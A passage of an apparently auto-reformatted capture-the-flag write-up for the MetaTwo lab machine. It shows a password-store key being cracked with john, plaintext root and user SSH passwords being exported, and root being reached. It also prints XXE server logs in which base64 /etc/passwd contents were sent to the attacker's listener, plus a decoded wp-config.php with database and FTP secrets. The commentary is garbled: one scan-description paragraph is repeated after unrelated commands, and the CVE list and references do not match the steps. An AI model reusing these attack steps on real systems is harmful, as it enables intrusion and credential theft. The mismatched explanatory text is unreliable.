/var/www/metapress.htb/blog/wp-admin/js/application-passwords.js
/var/www/metapress.htb/blog/wp-admin/js/application-passwords.min.js
/var/www/metapress.htb/blog/wp-admin/js/password-strength-meter.js
/var/www/metapress.htb/blog/wp-admin/js/password-strength-meter.min.js
  #)There are more creds/passwds files in the previous parent folder

/var/www/metapress.htb/blog/wp-includes/rest-api/endpoints/class-wp-rest-application-passwords-controller.php

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs

╔══════════╣ Searching passwords inside logs (limit 70)

                                ╔════════════════╗
════════════════════════════════╣ API Keys Regex ╠════════════════════════════════                                                                    
                                ╚════════════════╝                                                                                                    
Regexes to search for API keys aren't activated, use param '-r' 

jnelson@meta2:/tmp$ 

```

This command is used here to enumerate the exposed services and collect actionable fingerprints before exploitation. The focus is on discovering open ports, service versions, and protocol behavior that can guide the next attack decision. Key flags are kept visible so the same scan can be reproduced during validation or retesting.

```bash
total 36
drwxr-xr-x 5 jnelson jnelson 4096 Mar  4 15:58 .
drwxr-xr-x 3 root    root    4096 Oct  5  2022 ..
lrwxrwxrwx 1 root    root       9 Jun 26  2022 .bash_history -> /dev/null
-rw-r--r-- 1 jnelson jnelson  220 Jun 26  2022 .bash_logout
-rw-r--r-- 1 jnelson jnelson 3526 Jun 26  2022 .bashrc
drwx------ 3 jnelson jnelson 4096 Mar  4 15:58 .gnupg
drwxr-xr-x 3 jnelson jnelson 4096 Oct 25  2022 .local
dr-xr-x--- 3 jnelson jnelson 4096 Oct 25  2022 .passpie
-rw-r--r-- 1 jnelson jnelson  807 Jun 26  2022 .profile
-rw-r----- 1 root    jnelson   33 Mar  4 15:33 user.txt
```

This command is used here to enumerate the exposed services and collect actionable fingerprints before exploitation. The focus is on discovering open ports, service versions, and protocol behavior that can guide the next attack decision. Key flags are kept visible so the same scan can be reproduced during validation or retesting.

```bash
ls -la
cd ssh/
```

```bash
jnelson@meta2:~/.passpie$ ls -la
total 24
dr-xr-x--- 3 jnelson jnelson 4096 Oct 25  2022 .
drwxr-xr-x 5 jnelson jnelson 4096 Mar  4 15:58 ..
-r-xr-x--- 1 jnelson jnelson    3 Jun 26  2022 .config
-r-xr-x--- 1 jnelson jnelson 5243 Jun 26  2022 .keys
dr-xr-x--- 2 jnelson jnelson 4096 Oct 25  2022 ssh
jnelson@meta2:~/.passpie$ cd ssh/
jnelson@meta2:~/.passpie/ssh$ ls -la
total 16
dr-xr-x--- 2 jnelson jnelson 4096 Oct 25  2022 .
dr-xr-x--- 3 jnelson jnelson 4096 Oct 25  2022 ..
-r-xr-x--- 1 jnelson jnelson  683 Oct 25  2022 jnelson.pass
-r-xr-x--- 1 jnelson jnelson  673 Oct 25  2022 root.pass

```

This command is used here to enumerate the exposed services and collect actionable fingerprints before exploitation. The focus is on discovering open ports, service versions, and protocol behavior that can guide the next attack decision. Key flags are kept visible so the same scan can be reproduced during validation or retesting.

```bash
✅[CPU:2][MEM:45][TUN0:10.10.14.41][...ome/n0z0/work/htb/MetaTwo]
🐉 gpg2john keys >gpg.john

```

This command is used here to enumerate the exposed services and collect actionable fingerprints before exploitation. The focus is on discovering open ports, service versions, and protocol behavior that can guide the next attack decision. Key flags are kept visible so the same scan can be reproduced during validation or retesting.

```bash
✅[CPU:2][MEM:45][TUN0:10.10.14.41][...ome/n0z0/work/htb/MetaTwo]
🐉 cat gpg.john 
Passpie:$gpg$*17*54*3072*e975911867862609115f302a3d0196aec0c2ebf79a84c0303056df921c965e589f82d7dd71099ed9749408d5ad17a4421006d89b49c0*3*254*2*7*16*21d36a3443b38bad35df0f0e2c77f6b9*65011712*907cb55ccb37aaad:::Passpie (Auto-generated by Passpie) <passpie@local>::keys
```

This command is used here to enumerate the exposed services and collect actionable fingerprints before exploitation. The focus is on discovering open ports, service versions, and protocol behavior that can guide the next attack decision. Key flags are kept visible so the same scan can be reproduced during validation or retesting.

```bash
✅[CPU:2][MEM:45][TUN0:10.10.14.41][...ome/n0z0/work/htb/MetaTwo]
🐉 john gpg.john --wordlist=/usr/share/wordlists/rockyou.txt                                   
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65011712 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 7 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
blink182         (Passpie)     
1g 0:00:00:01 DONE (2025-03-05 23:32) 0.9174g/s 154.1p/s 154.1c/s 154.1C/s ginger..987654
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

This command is used here to enumerate the exposed services and collect actionable fingerprints before exploitation. The focus is on discovering open ports, service versions, and protocol behavior that can guide the next attack decision. Key flags are kept visible so the same scan can be reproduced during validation or retesting.

```bash
passpie export pass
cat pass
```

```bash
jnelson@meta2:~$ passpie export pass 
Passphrase: 
jnelson@meta2:~$ cat pass 
credentials:
- comment: ''
  fullname: root@ssh
  login: root
  modified: 2022-06-26 08:58:15.621572
  name: ssh
  password: !!python/unicode 'p7qfAZt4_A1xo_0x'
- comment: ''
  fullname: jnelson@ssh
  login: jnelson
  modified: 2022-06-26 08:58:15.514422
  name: ssh
  password: !!python/unicode 'Cb4_JmWM8zUZWMu@Ys'
handler: passpie
version: 1.0
```

This command is used here to enumerate the exposed services and collect actionable fingerprints before exploitation. The focus is on discovering open ports, service versions, and protocol behavior that can guide the next attack decision. Key flags are kept visible so the same scan can be reproduced during validation or retesting.

```bash
su root
id
ls -la
cat user.txt
cat /root/root.txt
```

```bash
jnelson@meta2:~$ su root
Password: 
root@meta2:/home/jnelson# id
uid=0(root) gid=0(root) groups=0(root)
root@meta2:/home/jnelson# ls -la
total 40
drwxr-xr-x 5 jnelson jnelson 4096 Mar  5 14:34 .
drwxr-xr-x 3 root    root    4096 Oct  5  2022 ..
lrwxrwxrwx 1 root    root       9 Jun 26  2022 .bash_history -> /dev/null
-rw-r--r-- 1 jnelson jnelson  220 Jun 26  2022 .bash_logout
-rw-r--r-- 1 jnelson jnelson 3526 Jun 26  2022 .bashrc
drwx------ 3 jnelson jnelson 4096 Mar  5 14:24 .gnupg
drwxr-xr-x 3 jnelson jnelson 4096 Oct 25  2022 .local
-rw-r--r-- 1 jnelson jnelson  347 Mar  5 14:35 pass
dr-xr-x--- 3 jnelson jnelson 4096 Oct 25  2022 .passpie
-rw-r--r-- 1 jnelson jnelson  807 Jun 26  2022 .profile
-rw-r----- 1 root    jnelson   33 Mar  4 15:33 user.txt
root@meta2:/home/jnelson# cat user.txt 
811d89f456aa30153eecabebc3e82d92
root@meta2:/home/jnelson# cat /root/root.txt 
cbe51945b43f5d55fcdda42283c4387c
root@meta2:/home/jnelson# id
uid=0(root) gid=0(root) groups=0(root)
root@meta2:/home/jnelson# 

```

💡 なぜ有効か  
High-quality reconnaissance turns broad network exposure into a short list of exploitable paths. Service/version context allows precision targeting instead of blind exploitation attempts.

## 初期足がかり

No explicit foothold steps were recorded in this source file.

### CVE Notes

- **CVE-2021-22555**: A known vulnerability referenced in this chain and used as part of exploitation.
- **CVE-2021-29447**: A known vulnerability referenced in this chain and used as part of exploitation.
- **CVE-2021-3156**: A known vulnerability referenced in this chain and used as part of exploitation.
- **CVE-2021-3490**: A known vulnerability referenced in this chain and used as part of exploitation.
- **CVE-2022-0739**: A WordPress plugin vulnerability used to extract sensitive information and support further compromise.
- **CVE-2022-0847**: A known vulnerability referenced in this chain and used as part of exploitation.
- **CVE-2022-2586**: A known vulnerability referenced in this chain and used as part of exploitation.
- **CVE-2022-32250**: A known vulnerability referenced in this chain and used as part of exploitation.

💡 なぜ有効か  
Initial access succeeds when a real weakness is chained to controlled execution, credential theft, or authenticated pivoting. Captured outputs and callbacks validate that compromise is reproducible.

## 権限昇格

No explicit privilege escalation steps were recorded in this source file.

💡 なぜ有効か  
Privilege escalation depends on trust boundary mistakes such as unsafe sudo rules, writable execution paths, SUID abuse, or credential reuse. Enumerating and validating these conditions is essential for reliable root/administrator access.

## 認証情報

- `[Tue Mar  4 02:29:04 2025] 10.129.228.95:53028 [200]: GET /xxe.dtd`
- `[Tue Mar  4 02:29:05 2025] 10.129.228.95:53038 [404]: GET /?p=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KZ25hdHM6eDo0MTo0MTpHbmF0cyBCdWctUmVwb3J0aW5nIFN5c3RlbSAoYWRtaW4pOi92YXIvbGliL2duYXRzOi91c3Ivc2Jpbi9ub2xvZ2luCm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwMDo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMToxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMjoxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDk6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzc2hkOng6MTA0OjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kam5lbHNvbjp4OjEwMDA6MTAwMDpqbmVsc29uLCwsOi9ob21lL2puZWxzb246L2Jpbi9iYXNoCnN5c3RlbWQtdGltZXN5bmM6eDo5OTk6OTk5OnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb246LzovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLWNvcmVkdW1wOng6OTk4Ojk5ODpzeXN0ZW1kIENvcmUgRHVtcGVyOi86L3Vzci9zYmluL25vbG9naW4KbXlzcWw6eDoxMDU6MTExOk15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQpwcm9mdHBkOng6MTA2OjY1NTM0OjovcnVuL3Byb2Z0cGQ6L3Vzci9zYmluL25vbG9naW4KZnRwOng6MTA3OjY1NTM0Ojovc3J2L2Z0cDovdXNyL3NiaW4vbm9sb2dpbgo= - No such file or directory`
- `[Tue Mar  4 02:29:05 2025] 10.129.228.95:53050 [200]: GET /xxe.dtd`
- `[Tue Mar  4 02:29:06 2025] 10.129.228.95:53054 [404]: GET /?p=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KZ25hdHM6eDo0MTo0MTpHbmF0cyBCdWctUmVwb3J0aW5nIFN5c3RlbSAoYWRtaW4pOi92YXIvbGliL2duYXRzOi91c3Ivc2Jpbi9ub2xvZ2luCm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwMDo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMToxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMjoxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDk6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzc2hkOng6MTA0OjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kam5lbHNvbjp4OjEwMDA6MTAwMDpqbmVsc29uLCwsOi9ob21lL2puZWxzb246L2Jpbi9iYXNoCnN5c3RlbWQtdGltZXN5bmM6eDo5OTk6OTk5OnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb246LzovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLWNvcmVkdW1wOng6OTk4Ojk5ODpzeXN0ZW1kIENvcmUgRHVtcGVyOi86L3Vzci9zYmluL25vbG9naW4KbXlzcWw6eDoxMDU6MTExOk15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQpwcm9mdHBkOng6MTA2OjY1NTM0OjovcnVuL3Byb2Z0cGQ6L3Vzci9zYmluL25vbG9naW4KZnRwOng6MTA3OjY1NTM0Ojovc3J2L2Z0cDovdXNyL3NiaW4vbm9sb2dpbgo= - No such file or directory`
- `🐉 echo 'PD9waHANCi8qKiBUaGUgbmFtZSBvZiB0aGUgZGF0YWJhc2UgZm9yIFdvcmRQcmVzcyAqLw0KZGVmaW5lKCAnREJfTkFNRScsICdibG9nJyApOw0KDQovKiogTXlTUUwgZGF0YWJhc2UgdXNlcm5hbWUgKi8NCmRlZmluZSggJ0RCX1VTRVInLCAnYmxvZycgKTsNCg0KLyoqIE15U1FMIGRhdGFiYXNlIHBhc3N3b3JkICovDQpkZWZpbmUoICdEQl9QQVNTV09SRCcsICc2MzVBcUBUZHFyQ3dYRlVaJyApOw0KDQovKiogTXlTUUwgaG9zdG5hbWUgKi8NCmRlZmluZSggJ0RCX0hPU1QnLCAnbG9jYWxob3N0JyApOw0KDQovKiogRGF0YWJhc2UgQ2hhcnNldCB0byB1c2UgaW4gY3JlYXRpbmcgZGF0YWJhc2UgdGFibGVzLiAqLw0KZGVmaW5lKCAnREJfQ0hBUlNFVCcsICd1dGY4bWI0JyApOw0KDQovKiogVGhlIERhdGFiYXNlIENvbGxhdGUgdHlwZS4gRG9uJ3QgY2hhbmdlIHRoaXMgaWYgaW4gZG91YnQuICovDQpkZWZpbmUoICdEQl9DT0xMQVRFJywgJycgKTsNCg0KZGVmaW5lKCAnRlNfTUVUSE9EJywgJ2Z0cGV4dCcgKTsNCmRlZmluZSggJ0ZUUF9VU0VSJywgJ21ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfUEFTUycsICc5TllTX2lpQEZ5TF9wNU0yTnZKJyApOw0KZGVmaW5lKCAnRlRQX0hPU1QnLCAnZnRwLm1ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfQkFTRScsICdibG9nLycgKTsNCmRlZmluZSggJ0ZUUF9TU0wnLCBmYWxzZSApOw0KDQovKiojQCsNCiAqIEF1dGhlbnRpY2F0aW9uIFVuaXF1ZSBLZXlzIGFuZCBTYWx0cy4NCiAqIEBzaW5jZSAyLjYuMA0KICovDQpkZWZpbmUoICdBVVRIX0tFWScsICAgICAgICAgJz8hWiR1R08qQTZ4T0U1eCxwd2VQNGkqejttYHwuWjpYQClRUlFGWGtDUnlsN31gclhWRz0zIG4+KzNtPy5CLzonICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9LRVknLCAgJ3gkaSQpYjBdYjFjdXA7NDdgWVZ1YS9KSHElKjhVQTZnXTBid29FVzo5MUVaOWhdcldsVnElSVE2NnBmez1dYSUnICk7DQpkZWZpbmUoICdMT0dHRURfSU5fS0VZJywgICAgJ0orbXhDYVA0ejxnLjZQXnRgeml2PmRkfUVFaSU0OCVKblJxXjJNakZpaXRuIyZuK0hYdl18fEUrRn5De3FLWHknICk7DQpkZWZpbmUoICdOT05DRV9LRVknLCAgICAgICAgJ1NtZURyJCRPMGppO145XSpgfkdOZSFwWEBEdldiNG05RWQ9RGQoLnItcXteeihGPyk3bXhOVWc5ODZ0UU83TzUnICk7DQpkZWZpbmUoICdBVVRIX1NBTFQnLCAgICAgICAgJ1s7VEJnYy8sTSMpZDVmW0gqdGc1MGlmVD9adi41V3g9YGxAdiQtdkgqPH46MF1zfWQ8Jk07Lix4MHp+Uj4zIUQnICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9TQUxUJywgJz5gVkFzNiFHOTU1ZEpzPyRPNHptYC5RO2FtaldedUpya18xLWRJKFNqUk9kV1tTJn5vbWlIXmpWQz8yLUk/SS4nICk7DQpkZWZpbmUoICdMT0dHRURfSU5fU0FMVCcsICAgJzRbZlNeMyE9JT9ISW9wTXBrZ1lib3k4LWpsXmldTXd9WSBkfk49Jl5Kc0lgTSlGSlRKRVZJKSBOI05PaWRJZj0nICk7DQpkZWZpbmUoICdOT05DRV9TQUxUJywgICAgICAgJy5zVSZDUUBJUmxoIE87NWFzbFkrRnE4UVdoZVNOeGQ2VmUjfXchQnEsaH1WOWpLU2tUR3N2JVk0NTFGOEw9YkwnICk7DQoNCi8qKg0KICogV29yZFByZXNzIERhdGFiYXNlIFRhYmxlIHByZWZpeC4NCiAqLw0KJHRhYmxlX3ByZWZpeCA9ICd3cF8nOw0KDQovKioNCiAqIEZvciBkZXZlbG9wZXJzOiBXb3JkUHJlc3MgZGVidWdnaW5nIG1vZGUuDQogKiBAbGluayBodHRwczovL3dvcmRwcmVzcy5vcmcvc3VwcG9ydC9hcnRpY2xlL2RlYnVnZ2luZy1pbi13b3JkcHJlc3MvDQogKi8NCmRlZmluZSggJ1dQX0RFQlVHJywgZmFsc2UgKTsNCg0KLyoqIEFic29sdXRlIHBhdGggdG8gdGhlIFdvcmRQcmVzcyBkaXJlY3RvcnkuICovDQppZiAoICEgZGVmaW5lZCggJ0FCU1BBVEgnICkgKSB7DQoJZGVmaW5lKCAnQUJTUEFUSCcsIF9fRElSX18gLiAnLycgKTsNCn0NCg0KLyoqIFNldHMgdXAgV29yZFByZXNzIHZhcnMgYW5kIGluY2x1ZGVkIGZpbGVzLiAqLw0KcmVxdWlyZV9vbmNlIEFCU1BBVEggLiAnd3Atc2V0dGluZ3MucGhwJzsNCg==' |base64 -d`
- `define( 'FTP_BASE', 'blog/' );`
- `/**#@+`
- `*/`
- `define( 'AUTH_KEY',         '?!Z$uGO*A6xOE5x,pweP4i*z;m`|.Z:X@)QRQFXkCRyl7}`rXVG=3 n>+3m?.B/:' );`
- `define( 'SECURE_AUTH_KEY',  'x$i$)b0]b1cup;47`YVua/JHq%*8UA6g]0bwoEW:91EZ9h]rWlVq%IQ66pf{=]a%' );`

## まとめ・学んだこと

- Validate external attack surface continuously, especially exposed admin interfaces and secondary services.
- Harden secret handling and remove plaintext credentials from reachable paths and backups.
- Limit privilege boundaries: audit SUID binaries, sudo rules, and delegated scripts/automation.
- Keep exploitation evidence reproducible with clear command logs and result validation at each stage.

### Supplemental Notes

|---|---|
|---|---|---|
## 参考文献

- RustScan: https://github.com/RustScan/RustScan
- Nmap: https://nmap.org/
- HackTricks Linux Privilege Escalation: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html
- GTFOBins: https://gtfobins.org/
- Certipy: https://github.com/ly4k/Certipy
- BloodHound: https://github.com/BloodHoundAD/BloodHound
- CVE-2021-22555: https://nvd.nist.gov/vuln/detail/CVE-2021-22555
- CVE-2021-29447: https://nvd.nist.gov/vuln/detail/CVE-2021-29447
- CVE-2021-3156: https://nvd.nist.gov/vuln/detail/CVE-2021-3156
- CVE-2021-3490: https://nvd.nist.gov/vuln/detail/CVE-2021-3490
- CVE-2022-0739: https://nvd.nist.gov/vuln/detail/CVE-2022-0739
- CVE-2022-0847: https://nvd.nist.gov/vuln/detail/CVE-2022-0847
- CVE-2022-2586: https://nvd.nist.gov/vuln/detail/CVE-2022-2586
- CVE-2022-32250: https://nvd.nist.gov/vuln/detail/CVE-2022-32250
